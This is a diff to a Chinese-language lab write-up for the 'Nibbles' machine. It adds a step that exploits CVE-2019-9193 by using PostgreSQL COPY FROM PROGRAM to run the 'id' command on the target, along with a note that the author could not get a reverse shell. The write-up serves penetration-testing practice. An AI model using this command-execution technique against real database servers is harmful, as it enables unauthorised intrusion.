@@ -1,6 +1,6 @@
 ---
 icon: check
-description: Medium / Linux / PostgreSQL
+description: Medium / Linux / PostgreSQL命令执行 / CVE-2019-9193
 ---
 
 # ✔️ Nibbles
@@ -72,63 +72,44 @@ psql -h 192.168.210.47 -p 5437 -U postgres
 
 <figure><img src="../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>
 
-*
-
-
-
-
-
-
-
 ### GET SHELL
 
+* 根据上述搜索出的利用脚本得知漏洞为CVE-2019-9193，搜索找到可手动利用的步骤：
 
+<figure><img src="../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
 
+* 验证结果说明目标确实存在着命令执行漏洞：
 
+```bash
+\c postgres
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec; 
+```
 
+<figure><img src="../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
 
+{% hint style="info" %}
+本例尝试用手动利用和脚本利用均无法成功反弹shell，暂不清楚原因先搁置...
+{% endhint %}
 
+<figure><img src="../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
 
-
-
+***
 
 ## 权限提升
 
 ### 本地信息收集
 
-
-
-
-
-
-
 ### 漏洞利用
 
-
-
-
-
-
-
-
-
 ### ROOT
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 {% hint style="info" %}
 
